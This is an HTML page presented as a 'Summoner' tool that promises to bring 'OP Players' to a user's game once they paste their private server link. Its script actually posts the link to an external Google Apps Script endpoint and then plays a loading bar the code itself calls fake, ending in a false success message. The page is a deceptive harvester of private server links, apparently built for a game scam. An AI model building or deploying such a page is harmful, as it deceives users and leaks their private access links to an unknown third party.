<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>D3syncX Summoner 😈</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    input {
      padding: 10px;
      border: none;
      border-radius: 5px;
      width: 300px;
      text-align: center;
      margin-bottom: 20px;
    }
    button {
      background-color: #6a00ff;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #8b33ff;
    }
    #status {
      margin-top: 20px;
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <h1>D3syncX Summoner 😈</h1>
  <p>Paste your private server link below 👇</p>
  <input type="text" id="linkInput" placeholder="Enter link here...">
  <button onclick="sendLink()">Summon OP Players</button>
  <p id="status"></p>

  <script>
    async function sendLink() {
      const linkInput = document.getElementById("linkInput").value;
      const status = document.getElementById("status");

      if (!linkInput.startsWith("https://")) {
        status.innerText = "❌ Invalid link!";
        return;
      }

      status.innerText = "Summoning players... (0%)";

      const scriptURL = "https://script.google.com/macros/s/AKfycbxTe0pa9oYiVC_S1GnbxkhBaweFpWJ6M6cZVjfmkO28SdOZ3enq34TTfJRKT2_etxzd/exec";

      try {
        await fetch(scriptURL, {
          method: "POST",
          body: JSON.stringify({ link: linkInput }),
          headers: { "Content-Type": "application/json" },
        });

        // Fake loading bar
        let percent = 0;
        const loading = setInterval(() => {
          percent += 2;
          status.innerText = `Summoning players... (${percent}%)`;
          if (percent >= 100) {
            clearInterval(loading);
            status.innerText = "✅ OP Players have been summoned!";
          }
        }, 100);
      } catch (error) {
        status.innerText = "⚠️ Error sending link!";
      }
    }
  </script>
</body>
</html>
